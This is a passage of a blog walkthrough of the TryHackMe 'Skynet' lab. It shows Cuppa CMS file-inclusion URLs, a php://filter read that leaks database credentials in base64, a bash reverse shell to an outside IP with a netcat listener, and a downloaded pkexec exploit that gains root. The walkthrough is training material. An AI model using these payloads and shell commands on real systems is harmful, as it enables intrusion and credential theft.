+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB/notes$ searchsploit cuppa                                </span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                                               |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Cuppa CMS - <span class="string">&#x27;/alertConfigField.php&#x27;</span> Local/Remote File Inclusion                                                                                                                                              | php/webapps/25971.txt</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                                                                                                                                                                               </span><br><span class="line">Crazyinside:~/HTB/notes$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################################################</span></span><br><span class="line">EXPLOIT</span><br><span class="line"><span class="comment">#####################################################</span></span><br><span class="line"></span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">Moreover, We could access Configuration.php <span class="built_in">source</span> code via PHPStream</span><br><span class="line"></span><br><span class="line">For Example:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Base64 Encode Output:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+</span><br><span class="line">-----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720223727997.png" srcset="/img/loading.gif" lazyload alt="image-20220720223727997"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/10.14.24.91/1337 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F10.14.24.91%2F1337%20%3C%261%27</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720224048199.png" srcset="/img/loading.gif" lazyload alt="image-20220720224048199"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Crazyinside:~/HTB/notes$ nc -lvnp 1337                 </span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.14.24.91] from (UNKNOWN) [10.10.27.117] 49280</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1287): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">www-data@skynet:/home/milesdyson$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/sbin/mount.cifs</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">www-data@skynet:/home/milesdyson$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@skynet:/tmp$ wget http://10.14.24.91/CVE-2021-2043.py</span><br><span class="line">wget http://10.14.24.91/CVE-2021-2043.py</span><br><span class="line">--2022-07-20 09:44:05--  http://10.14.24.91/CVE-2021-2043.py</span><br><span class="line">Connecting to 10.14.24.91:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3448 (3.4K) [text/x-python]</span><br><span class="line">Saving to: <span class="string">&#x27;CVE-2021-2043.py&#x27;</span></span><br><span class="line"></span><br><span class="line">     0K ...                                                   100% 1009K=0.003s</span><br><span class="line"></span><br><span class="line">2022-07-20 09:44:06 (1009 KB/s) - <span class="string">&#x27;CVE-2021-2043.py&#x27;</span> saved [3448/3448]</span><br><span class="line"></span><br><span class="line">www-data@skynet:/tmp$ python3 ./CVE-2021-2043.py</span><br><span class="line">python3 ./CVE-2021-2043.py</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">GCONV_PATH=.</span><br><span class="line">gconv</span><br><span class="line">pwn.so</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe Walkthrough - Skynet</div>
+      <div>https://crazyinside.github.io/post/Tryhackme-Skynet.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/TryHackMe-VulnNet%20Active.html" title="TryHackMe Walkthrough - VulnNet Active">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe Walkthrough - VulnNet Active</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/TryHackMe-RazorBlack.html" title="TryHackMe Walkthrough - RazorBlack">
+                        <span class="hidden-mobile">TryHackMe Walkthrough - RazorBlack</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
